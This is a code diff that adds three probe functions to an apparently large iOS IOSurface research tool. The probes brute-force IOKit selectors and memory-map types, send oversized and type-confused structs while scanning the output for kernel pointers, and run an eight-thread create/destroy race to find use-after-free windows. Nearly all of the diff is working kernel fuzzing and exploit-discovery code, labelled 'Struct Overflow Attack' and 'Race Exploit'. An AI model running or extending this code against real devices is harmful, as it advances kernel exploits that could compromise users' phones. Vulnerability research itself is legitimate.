@@ -15201,3 +15201,535 @@ void iosurface_research_addr_redirect(ISRLogBlock log, ISRDoneBlock done) {
         }
     });
 }
+
+// =============================================================================
+// MARK: - Round 23: IOKit Brute Force
+// =============================================================================
+
+#pragma mark - Probe 70: IOKit Brute
+
+void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+        CFTimeInterval t0 = CACurrentMediaTime();
+
+        int acceptCount = 0;
+        int outputCount = 0;
+        int mapCount = 0;
+        int crashSurvived = 0;
+        NSString *verdict = @"PENDING";
+
+        log(@"IOKBRUTE: === Probe 70: IOKit Selector Brute Force ===");
+        log(@"IOKBRUTE: Fuzzing selectors 0-199 on IOSurfaceRootUserClient");
+
+        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn = 0;
+        kern_return_t kr = 0;
+
+        if (service == IO_OBJECT_NULL) {
+            log(@"IOKBRUTE: FAIL — IOSurfaceRoot service not found");
+        }
+
+        if (service != IO_OBJECT_NULL && !isr_stopped()) {
+            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+            IOObjectRelease(service);
+            log([NSString stringWithFormat:@"IOKBRUTE: IOServiceOpen kr=%d conn=%u", kr, conn]);
+
+            if (kr != KERN_SUCCESS) {
+                log(@"IOKBRUTE: FAIL — cannot open user client");
+            }
+
+            if (kr == KERN_SUCCESS && !isr_stopped()) {
+                // Create a surface for ID embedding
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @64,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+                uint32_t surfID = surf ? sym.getID(surf) : 0;
+                log([NSString stringWithFormat:@"IOKBRUTE: Test surface ID=%u", surfID]);
+
+                // Phase 1: Selector fuzzing 0-199
+                for (uint32_t sel = 0; sel < 200 && !isr_stopped(); sel++) {
+                    // Try 1: no inputs
+                    uint64_t scalarOut[16] = {0};
+                    uint32_t scalarOutCnt = 16;
+                    size_t structOutSize = 4096;
+                    uint8_t structOut[4096] = {0};
+
+                    kr = IOConnectCallMethod(conn, sel,
+                        NULL, 0, NULL, 0,
+                        scalarOut, &scalarOutCnt,
+                        structOut, &structOutSize);
+                    crashSurvived++;
+
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc) { // not KERN_INVALID_ARGUMENT / MIG_BAD_ID
+                        acceptCount++;
+                        log([NSString stringWithFormat:@"IOKBRUTE: sel=%u no-input kr=0x%x outScalar=%u outStruct=%zu",
+                             sel, kr, scalarOutCnt, structOutSize]);
+
+                        // Check for output data
+                        BOOL hasOutput = NO;
+                        for (uint32_t i = 0; i < scalarOutCnt && i < 16; i++) {
+                            if (scalarOut[i] != 0) { hasOutput = YES; break; }
+                        }
+                        for (size_t i = 0; i < structOutSize && i < 4096; i++) {
+                            if (structOut[i] != 0) { hasOutput = YES; break; }
+                        }
+                        if (hasOutput) {
+                            outputCount++;
+                            log([NSString stringWithFormat:@"IOKBRUTE: sel=%u HAS OUTPUT DATA — potential kernel leak",
+                                 sel]);
+                            if (scalarOutCnt > 0 && scalarOut[0] != 0) {
+                                log([NSString stringWithFormat:@"IOKBRUTE: sel=%u scalar[0]=0x%llx", sel, scalarOut[0]]);
+                            }
+                        }
+                    }
+
+                    // Try 2: scalar input with surface ID
+                    if (!isr_stopped()) {
+                        uint64_t scalarIn[1] = { surfID };
+                        memset(scalarOut, 0, sizeof(scalarOut));
+                        scalarOutCnt = 16;
+                        memset(structOut, 0, sizeof(structOut));
+                        structOutSize = 4096;
+
+                        kr = IOConnectCallMethod(conn, sel,
+                            scalarIn, 1, NULL, 0,
+                            scalarOut, &scalarOutCnt,
+                            structOut, &structOutSize);
+                        crashSurvived++;
+
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            log([NSString stringWithFormat:@"IOKBRUTE: sel=%u scalar(surfID) kr=0x%x", sel, kr]);
+                        }
+                    }
+
+                    // Try 3: struct input with embedded markers
+                    if (!isr_stopped()) {
+                        uint8_t structIn[64] = {0};
+                        memcpy(structIn, &surfID, 4);
+                        uint64_t marker = 0xDEADBEEF41414141ULL;
+                        memcpy(structIn + 8, &marker, 8);
+                        memcpy(structIn + 16, &marker, 8);
+                        for (int i = 24; i < 64; i++) structIn[i] = (uint8_t)(i & 0xFF);
+
+                        memset(scalarOut, 0, sizeof(scalarOut));
+                        scalarOutCnt = 16;
+                        memset(structOut, 0, sizeof(structOut));
+                        structOutSize = 4096;
+
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, structIn, 64,
+                            scalarOut, &scalarOutCnt,
+                            structOut, &structOutSize);
+                        crashSurvived++;
+
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            log([NSString stringWithFormat:@"IOKBRUTE: sel=%u struct64 kr=0x%x outStruct=%zu",
+                                 sel, kr, structOutSize]);
+                        }
+                    }
+
+                    if (sel % 50 == 49) {
+                        log([NSString stringWithFormat:@"IOKBRUTE: Progress: %u/200 selectors, %d accepted, %d output",
+                             sel + 1, acceptCount, outputCount]);
+                    }
+                } // end selector loop
+
+                // Phase 2: IOConnectMapMemory types 0-15
+                if (!isr_stopped()) {
+                    log(@"IOKBRUTE: Phase 2 — IOConnectMapMemory types 0-15");
+                    for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t size = 0;
+                        kr = IOConnectMapMemory64(conn, memType, mach_task_self(),
+                            &addr, &size, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS) {
+                            mapCount++;
+                            log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u SUCCEEDED addr=0x%llx size=%llu",
+                                 memType, (uint64_t)addr, (uint64_t)size]);
+                            // Read first 64 bytes
+                            if (size > 0 && addr != 0) {
+                                uint8_t *mapped = (uint8_t *)(uintptr_t)addr;
+                                NSMutableString *hex = [NSMutableString new];
+                                for (int i = 0; i < 64 && i < (int)size; i++) {
+                                    [hex appendFormat:@"%02x", mapped[i]];
+                                }
+                                log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u data=%@", memType, hex]);
+                            }
+                            IOConnectUnmapMemory64(conn, memType, mach_task_self(), addr);
+                        } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u kr=0x%x", memType, kr]);
+                        }
+                    }
+                }
+
+                if (surf) CFRelease(surf);
+                IOServiceClose(conn);
+            } // end conn success
+        } // end service found
+
+        CFTimeInterval elapsed = CACurrentMediaTime() - t0;
+        log([NSString stringWithFormat:@"IOKBRUTE: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"IOKBRUTE: accepted=%d output=%d mapped=%d survived=%d",
+             acceptCount, outputCount, mapCount, crashSurvived]);
+
+        if (outputCount > 0 && mapCount > 0) verdict = @"CRITICAL — kernel data leak via selectors AND mapped memory";
+        else if (outputCount > 0) verdict = @"HIGH — selectors return kernel data";
+        else if (mapCount > 0) verdict = @"HIGH — kernel memory mapped to userspace";
+        else if (acceptCount > 10) verdict = @"MEDIUM — many selectors accept input, exploitation possible";
+        else if (acceptCount > 0) verdict = @"LOW — some selectors accessible";
+        else verdict = @"LOW — all selectors rejected";
+        log([NSString stringWithFormat:@"IOKBRUTE: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"acceptCount": @(acceptCount),
+            @"outputCount": @(outputCount),
+            @"mapCount": @(mapCount),
+            @"crashSurvived": @(crashSurvived),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed)
+        };
+        isr_checkpoint(@"ISR-IOKitBrute-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+#pragma mark - Probe 71: Struct Overflow
+
+void iosurface_research_struct_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+        CFTimeInterval t0 = CACurrentMediaTime();
+
+        int leakCount = 0;
+        int acceptCount = 0;
+        int typeConfuseCount = 0;
+        NSString *verdict = @"PENDING";
+
+        log(@"STRUCTOVF: === Probe 71: Struct Overflow Attack ===");
+        log(@"STRUCTOVF: Sending oversized structs to selectors 0-20");
+
+        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn = 0;
+        kern_return_t kr = 0;
+
+        if (service == IO_OBJECT_NULL) {
+            log(@"STRUCTOVF: FAIL — IOSurfaceRoot service not found");
+        }
+
+        if (service != IO_OBJECT_NULL && !isr_stopped()) {
+            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+            IOObjectRelease(service);
+
+            if (kr != KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"STRUCTOVF: FAIL — IOServiceOpen kr=%d", kr]);
+            }
+
+            if (kr == KERN_SUCCESS && !isr_stopped()) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @64,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+                uint32_t surfID = surf ? sym.getID(surf) : 0;
+
+                size_t sizes[] = { 64, 128, 256, 512, 1024, 2048, 4096 };
+                int numSizes = 7;
+
+                for (uint32_t sel = 0; sel <= 20 && !isr_stopped(); sel++) {
+                    for (int si = 0; si < numSizes && !isr_stopped(); si++) {
+                        size_t sz = sizes[si];
+                        uint8_t *structIn = (uint8_t *)calloc(1, sz);
+                        if (!structIn) continue;
+
+                        // Fill pattern
+                        memcpy(structIn, &surfID, 4);
+                        uint64_t marker = 0xDEADBEEF41414141ULL;
+                        if (sz >= 16) memcpy(structIn + 8, &marker, 8);
+                        for (size_t i = 24; i < sz; i++) structIn[i] = (uint8_t)(i & 0xFF);
+
+                        uint8_t structOut[4096] = {0};
+                        size_t structOutSize = 4096;
+                        uint64_t scalarOut[16] = {0};
+                        uint32_t scalarOutCnt = 16;
+
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, structIn, sz,
+                            scalarOut, &scalarOutCnt,
+                            structOut, &structOutSize);
+
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            acceptCount++;
+                            log([NSString stringWithFormat:@"STRUCTOVF: sel=%u size=%zu kr=0x%x outStruct=%zu",
+                                 sel, sz, kr, structOutSize]);
+
+                            // Check output for kernel data
+                            BOOL hasLeak = NO;
+                            for (size_t i = 0; i < structOutSize && i < 4096; i++) {
+                                if (structOut[i] != 0) { hasLeak = YES; break; }
+                            }
+                            if (hasLeak) {
+                                leakCount++;
+                                NSMutableString *hex = [NSMutableString new];
+                                size_t dumpLen = structOutSize < 128 ? structOutSize : 128;
+                                for (size_t i = 0; i < dumpLen; i++) {
+                                    [hex appendFormat:@"%02x", structOut[i]];
+                                }
+                                log([NSString stringWithFormat:@"STRUCTOVF: sel=%u size=%zu LEAK data=%@",
+                                     sel, sz, hex]);
+
+                                // Check for kernel pointer patterns (0xfffffff0...)
+                                for (size_t i = 0; i + 8 <= structOutSize && i + 8 <= 4096; i += 8) {
+                                    uint64_t val = 0;
+                                    memcpy(&val, structOut + i, 8);
+                                    if ((val >> 36) == 0xFFFFFFF) {
+                                        log([NSString stringWithFormat:@"STRUCTOVF: KERNEL PTR at offset %zu = 0x%llx",
+                                             i, val]);
+                                    }
+                                }
+                            }
+                        }
+
+                        free(structIn);
+                    } // end sizes loop
+
+                    // Type confusion: send struct as scalar input
+                    if (!isr_stopped()) {
+                        uint64_t fakeScalar[8] = {0};
+                        fakeScalar[0] = surfID;
+                        fakeScalar[1] = 0xDEADBEEF41414141ULL;
+                        fakeScalar[2] = 0x4141414141414141ULL;
+                        fakeScalar[3] = 0xFFFFFFFF00000000ULL;
+
+                        uint8_t structOut2[4096] = {0};
+                        size_t structOut2Size = 4096;
+                        uint64_t scalarOut2[16] = {0};
+                        uint32_t scalarOut2Cnt = 16;
+
+                        kr = IOConnectCallMethod(conn, sel,
+                            fakeScalar, 8, NULL, 0,
+                            scalarOut2, &scalarOut2Cnt,
+                            structOut2, &structOut2Size);
+
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            typeConfuseCount++;
+                            log([NSString stringWithFormat:@"STRUCTOVF: sel=%u TYPE-CONFUSE(scalar-as-struct) kr=0x%x outScalar=%u",
+                                 sel, kr, scalarOut2Cnt]);
+                        }
+                    }
+
+                    if (sel % 5 == 4) {
+                        log([NSString stringWithFormat:@"STRUCTOVF: Progress: sel %u/20, accepted=%d leaks=%d typeConfuse=%d",
+                             sel + 1, acceptCount, leakCount, typeConfuseCount]);
+                    }
+                } // end selector loop
+
+                if (surf) CFRelease(surf);
+                IOServiceClose(conn);
+            }
+        }
+
+        CFTimeInterval elapsed = CACurrentMediaTime() - t0;
+        log([NSString stringWithFormat:@"STRUCTOVF: Completed in %.2fs", elapsed]);
+
+        if (leakCount > 0) verdict = @"CRITICAL — kernel data leaked via oversized struct";
+        else if (typeConfuseCount > 3) verdict = @"HIGH — multiple selectors accept type-confused input";
+        else if (acceptCount > 10) verdict = @"MEDIUM — many selectors accept oversized structs";
+        else if (acceptCount > 0) verdict = @"LOW — some oversized structs accepted";
+        else verdict = @"LOW — all oversized structs rejected";
+        log([NSString stringWithFormat:@"STRUCTOVF: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"acceptCount": @(acceptCount),
+            @"leakCount": @(leakCount),
+            @"typeConfuseCount": @(typeConfuseCount),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed)
+        };
+        isr_checkpoint(@"ISR-StructOverflow-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+#pragma mark - Probe 72: Race Exploit
+
+void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+        CFTimeInterval t0 = CACurrentMediaTime();
+
+        __block int staleAccess = 0;
+        __block int unexpectedData = 0;
+        __block int raceHits = 0;
+        __block int iterations = 0;
+        NSString *verdict = @"PENDING";
+
+        log(@"RACEEXPL: === Probe 72: Race Exploit (TOCTOU) ===");
+        log(@"RACEEXPL: 8 threads, 200 iterations, IOConnectCallMethod + create/destroy race");
+
+        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn = 0;
+        kern_return_t kr = 0;
+
+        if (service == IO_OBJECT_NULL) {
+            log(@"RACEEXPL: FAIL — IOSurfaceRoot service not found");
+        }
+
+        if (service != IO_OBJECT_NULL && !isr_stopped()) {
+            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+            IOObjectRelease(service);
+
+            if (kr != KERN_SUCCESS) {
+                log([NSString stringWithFormat:@"RACEEXPL: FAIL — IOServiceOpen kr=%d", kr]);
+            }
+
+            if (kr == KERN_SUCCESS && !isr_stopped()) {
+                NSDictionary *baseProps = @{
+                    @"IOSurfaceWidth": @32,
+                    @"IOSurfaceHeight": @32,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+
+                for (int iter = 0; iter < 200 && !isr_stopped(); iter++) {
+                    iterations = iter + 1;
+
+                    // Create 50 surfaces
+                    NSMutableArray *surfaces = [NSMutableArray new];
+                    NSMutableArray *surfIDs = [NSMutableArray new];
+                    for (int i = 0; i < 50; i++) {
+                        IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)baseProps);
+                        if (s) {
+                            [surfaces addObject:(__bridge id)s];
+                            [surfIDs addObject:@(sym.getID(s))];
+                        }
+                    }
+
+                    __block volatile BOOL destroying = NO;
+                    __block volatile int destroyIdx = 0;
+                    dispatch_group_t group = dispatch_group_create();
+
+                    // Threads 0-3: IOConnectCallMethod with surface IDs
+                    for (int t = 0; t < 4; t++) {
+                        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                            uint32_t sel = t;
+                            for (int r = 0; r < 100 && !isr_stopped(); r++) {
+                                int idx = r % (int)surfIDs.count;
+                                uint32_t sid = [surfIDs[idx] unsignedIntValue];
+
+                                uint8_t structIn[32] = {0};
+                                memcpy(structIn, &sid, 4);
+                                uint64_t scalarOut[4] = {0};
+                                uint32_t scalarOutCnt = 4;
+                                uint8_t structOut[256] = {0};
+                                size_t structOutSize = 256;
+
+                                kern_return_t rkr = IOConnectCallMethod(conn, sel,
+                                    NULL, 0, structIn, 32,
+                                    scalarOut, &scalarOutCnt,
+                                    structOut, &structOutSize);
+
+                                // Check if we're using a destroyed surface's ID
+                                if (destroying && idx < destroyIdx) {
+                                    if (rkr == KERN_SUCCESS || rkr == 0) {
+                                        OSAtomicIncrement32(&raceHits);
+                                    }
+                                    // Check for unexpected data in output
+                                    for (int i = 0; i < 4; i++) {
+                                        if (scalarOut[i] != 0) {
+                                            OSAtomicIncrement32(&unexpectedData);
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                        });
+                    }
+
+                    // Threads 4-5: destroy surfaces rapidly
+                    for (int t = 0; t < 2; t++) {
+                        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                            destroying = YES;
+                            for (int i = t; i < (int)surfaces.count && !isr_stopped(); i += 2) {
+                                IOSurfaceRef s = (__bridge IOSurfaceRef)surfaces[i];
+                                CFRelease(s);
+                                destroyIdx = i + 1;
+                            }
+                        });
+                    }
+
+                    // Threads 6-7: create new surfaces to reclaim
+                    for (int t = 0; t < 2; t++) {
+                        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                            for (int i = 0; i < 25 && !isr_stopped(); i++) {
+                                IOSurfaceRef ns = sym.create((__bridge CFDictionaryRef)baseProps);
+                                if (ns) {
+                                    uint32_t newID = sym.getID(ns);
+                                    // Check if we got a recycled ID
+                                    for (NSNumber *oldID in surfIDs) {
+                                        if (newID == oldID.unsignedIntValue) {
+                                            OSAtomicIncrement32(&staleAccess);
+                                            break;
+                                        }
+                                    }
+                                    CFRelease(ns);
+                                }
+                            }
+                        });
+                    }
+
+                    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
+
+                    if (iter % 50 == 49) {
+                        log([NSString stringWithFormat:@"RACEEXPL: iter %d/200 — raceHits=%d staleAccess=%d unexpectedData=%d",
+                             iter + 1, raceHits, staleAccess, unexpectedData]);
+                    }
+                } // end iterations
+
+                IOServiceClose(conn);
+            }
+        }
+
+        CFTimeInterval elapsed = CACurrentMediaTime() - t0;
+        log([NSString stringWithFormat:@"RACEEXPL: Completed %d iterations in %.2fs", iterations, elapsed]);
+        log([NSString stringWithFormat:@"RACEEXPL: raceHits=%d staleAccess=%d unexpectedData=%d",
+             raceHits, staleAccess, unexpectedData]);
+
+        if (unexpectedData > 0 && raceHits > 0) verdict = @"CRITICAL — race condition leaks kernel data via stale selector";
+        else if (raceHits > 5) verdict = @"HIGH — multiple TOCTOU race hits on destroyed surfaces";
+        else if (staleAccess > 0 && raceHits > 0) verdict = @"HIGH — stale ID reuse + selector race confirmed";
+        else if (staleAccess > 0) verdict = @"MEDIUM — ID recycling during race detected";
+        else if (raceHits > 0) verdict = @"MEDIUM — selector accepted destroyed surface input";
+        else verdict = @"LOW — no race condition exploitable";
+        log([NSString stringWithFormat:@"RACEEXPL: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"iterations": @(iterations),
+            @"raceHits": @(raceHits),
+            @"staleAccess": @(staleAccess),
+            @"unexpectedData": @(unexpectedData),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed)
+        };
+        isr_checkpoint(@"ISR-RaceExploit-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
